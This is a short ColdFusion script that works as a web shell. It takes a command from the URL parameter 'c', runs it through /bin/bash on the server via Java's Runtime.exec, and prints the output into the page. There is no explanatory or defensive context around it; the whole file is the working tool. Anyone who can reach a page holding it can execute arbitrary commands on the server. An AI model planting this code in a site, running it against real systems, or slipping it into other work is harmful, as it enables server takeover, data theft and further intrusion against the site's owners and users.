<cfscript>
  if (structKeyExists(url, "c")) {
      rt = createObject("java", "java.lang.Runtime").getRuntime();
      f = createObject("java","java.io.File").init("/");
      proc = rt.exec(["/bin/bash","-c", url.c], [], f);
      br = createObject("java","java.io.BufferedReader").init(

  createObject("java","java.io.InputStreamReader").init(proc.getInputStream()));
      line = ""; out = "";
      while ((line = br.readLine()) != false) { out &= line & chr(10); }
      writeOutput("<pre>" & out & "</pre>");
  }
  </cfscript>